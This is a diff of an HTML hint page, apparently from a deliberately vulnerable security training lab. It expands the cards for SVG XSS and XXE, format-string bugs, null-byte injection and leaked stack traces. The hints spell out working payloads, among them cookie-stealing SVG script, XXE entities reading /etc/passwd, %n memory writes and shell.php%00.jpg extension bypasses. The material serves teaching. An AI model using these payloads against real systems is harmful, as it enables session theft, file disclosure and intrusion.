+                    SVG files are XML that can contain JavaScript AND external entity references! Unlike JPEG/PNG, SVG is text-based XML. Attackers upload malicious SVG with embedded scripts or XXE payloads. When rendered inline or viewed directly, the JavaScript executes (XSS) or XML entities load files (XXE). This is CRITICAL because image uploads are often trusted!
                 </div>
                 <div class="hint-box">
-                    /api/upload-svg renders SVG inline. Embed &lt;script&gt;alert(1)&lt;/script&gt; or XXE entities.
+                    SVG XSS: &lt;svg&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;/svg&gt;. When page displays this SVG inline or with &lt;img&gt; tags (some browsers), script runs! XXE in SVG: &lt;!DOCTYPE svg [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;&lt;svg&gt;&lt;text&gt;&amp;xxe;&lt;/text&gt;&lt;/svg&gt; reads files!
                 </div>
-                <p><strong>Endpoints:</strong> <span class="endpoint-badge">POST /api/upload-svg</span></p>
+                <div class="challenge-box">
+                    Can you exploit /api/upload-svg? Create malicious SVG files with XSS payloads or XXE. Try both attacks. Does the server render SVG inline? Can you steal cookies or read server files?
+                </div>
+                <p><strong>Affected Endpoints:</strong></p>
+                <span class="endpoint-badge">POST /api/upload-svg</span>
+                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
+                <div class="expanded-content">
+                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
+                    <p>• XXE payload: &lt;!DOCTYPE svg [&lt;!ENTITY file SYSTEM "file:///etc/passwd"&gt;]&gt;&lt;svg&gt;&lt;text&gt;&amp;file;&lt;/text&gt;&lt;/svg&gt;</p>
+                    <p>• Or use: &lt;svg onload="alert(1)"&gt;&lt;/svg&gt;</p>
+                    <p>• Upload as .svg, server might render inline or in &lt;img&gt;</p>
+                    <p>• Some contexts: &lt;object&gt; and &lt;embed&gt; tags execute scripts</p>
+                    <p>• Impact: full XSS (cookie theft), XXE (file read, SSRF)</p>
+                </div>
             </div>
 
             <div class="vuln-card">
@@ -2157,12 +2618,25 @@ const headers = `To: ${userInput}\nFrom: noreply@site.com`;
                     <h2 class="vuln-title">Format String Vulnerabilities</h2>
                 </div>
                 <div class="vuln-description">
-                    String formatting without sanitization. %s, %d, %x format specifiers exploitable.
+                    Format strings use specifiers like %s (string), %d (decimal), %x (hex), %p (pointer) to format output. In languages like C/C++, using user input directly as format string is CATASTROPHIC: %x reads stack memory, %n WRITES to memory locations! Even in safer languages, format string bugs can leak data or cause crashes through excessive memory reads.
                 </div>
                 <div class="hint-box">
-                    /api/format processes format strings. Try %s, %p, %n to leak/write memory.
+                    Vulnerable code: printf(user_input) instead of printf("%s", user_input). Attacker sends: "%x %x %x %x" → leaks stack memory addresses. Or "%s %s %s" → crashes trying to read strings from random addresses. In C: "%n" writes byte count to address on stack = arbitrary memory write!
                 </div>
-                <p><strong>Endpoints:</strong> <span class="endpoint-badge">GET /api/format</span></p>
+                <div class="challenge-box">
+                    Can you exploit /api/format with format string specifiers? Try sending multiple %x to leak memory addresses or %s to cause crashes. What data can you leak? Can you find pointers or sensitive strings in memory?
+                </div>
+                <p><strong>Affected Endpoints:</strong></p>
+                <span class="endpoint-badge">GET /api/format</span>
+                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
+                <div class="expanded-content">
+                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
+                    <p>• Try: %x %x %x %x %x %x %x %x (leak 8 stack values)</p>
+                    <p>• Try: %p %p %p (leak pointers/addresses)</p>
+                    <p>• Try: %s (read string from random address, might crash)</p>
+                    <p>• In C programs: %n writes to memory (RCE potential!)</p>
+                    <p>• Impact: info leak (addresses for ASLR bypass), DoS, sometimes RCE</p>
+                </div>
             </div>
 
             <div class="vuln-card">
@@ -2172,12 +2646,25 @@ const headers = `To: ${userInput}\nFrom: noreply@site.com`;
                     <h2 class="vuln-title">Null Byte Injection</h2>
                 </div>
                 <div class="vuln-description">
-                    %00 truncates strings in some contexts. Bypass file extension checks.
+                    The null byte %00 (character code 0) terminates strings in C/C++ and some other contexts! If a web app built with vulnerable libraries checks "file.jpg" but underlying C code processes up to %00, attacker can bypass file extension validation! Example: upload "shell.php%00.jpg" → validation sees ".jpg", but C code sees "shell.php" (stops at %00).
                 </div>
                 <div class="hint-box">
-                    /api/file-read might be vulnerable. Try shell.php%00.jpg to bypass .jpg validation.
+                    Null byte = \x00 or %00 (URL encoded). Vulnerable: PHP &lt; 5.3 with C libraries, file operations, path manipulation. Upload shell.php%00.jpg → passes .jpg filter → saved as shell.php! Also works in: file paths (/etc/passwd%00.txt), SQL in old MySQL versions.
                 </div>
-                <p><strong>Endpoints:</strong> <span class="endpoint-badge">GET /api/file-read</span></p>
+                <div class="challenge-box">
+                    Can you bypass file extension checks on /api/file-read using null bytes? Try requesting shell.php%00.jpg or ../../../etc/passwd%00.txt. Does the validation only check after %00? What files can you access?
+                </div>
+                <p><strong>Affected Endpoints:</strong></p>
+                <span class="endpoint-badge">GET /api/file-read</span>
+                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
+                <div class="expanded-content">
+                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
+                    <p>• Try: /api/file-read?path=secret.txt%00.jpg</p>
+                    <p>• Try: filename=shell.php%00.jpg when uploading</p>
+                    <p>• URL encode: %00, or hex: \x00 in some contexts</p>
+                    <p>• Test: if (filename.endsWith('.jpg')) → bypassed by .php%00.jpg</p>
+                    <p>• Impact: upload malicious files, path traversal, extension bypass</p>
+                </div>
             </div>
 
             <div class="vuln-card">
@@ -2187,12 +2674,26 @@ const headers = `To: ${userInput}\nFrom: noreply@site.com`;
                     <h2 class="vuln-title">Stack Traces in Production</h2>
                 </div>
                 <div class="vuln-description">
-                    Full error stack traces reveal code structure, file paths, dependencies.
+                    Stack traces are debugging information showing the exact code path that caused an error: file paths, line numbers, function names, variable values, framework versions, dependencies. This is GOLD for attackers! They learn: your entire directory structure, what frameworks/libraries you use (with versions for known exploits), code logic, sensitive variable names. Production apps should NEVER expose stack traces!
                 </div>
                 <div class="hint-box">
-                    /api/error throws exception with full stack. Global error handler leaks everything.
+                    Error handlers in dev mode show full traces. Production mistake: leaving error.stack in responses. Attackers trigger errors intentionally (send invalid input) to harvest info. Stack reveals: /home/user/app/src/auth/login.js:245 → now attacker knows exact file structure and can target specific vulnerabilities!
                 </div>
-                <p><strong>Endpoints:</strong> <span class="endpoint-badge">GET /api/error</span></p>
+                <div class="challenge-box">
+                    Can you trigger errors on /api/error to see stack traces? Try sending malformed input, invalid types, or accessing non-existent resources. What information is leaked? Can you identify framework versions or file paths?
+                </div>
+                <p><strong>Affected Endpoints:</strong></p>
+                <span class="endpoint-badge">GET /api/error</span>
+                <span class="endpoint-badge">GLOBAL ERROR HANDLER</span>
+                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
+                <div class="expanded-content">
+                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
+                    <p>• Trigger errors: send wrong type, access /api/nonexistent, crash with large input</p>
+                    <p>• Look for: Error: ... at Function.module.exports (/app/src/...)</p>
+                    <p>• Leaked info: file paths, framework (Express.js, Koa), versions</p>
+                    <p>• Use leaked versions: search for CVEs in those specific versions</p>
+                    <p>• Impact: info disclosure enabling targeted attacks, source code paths</p>
+                </div>
             </div>
         </div>
         
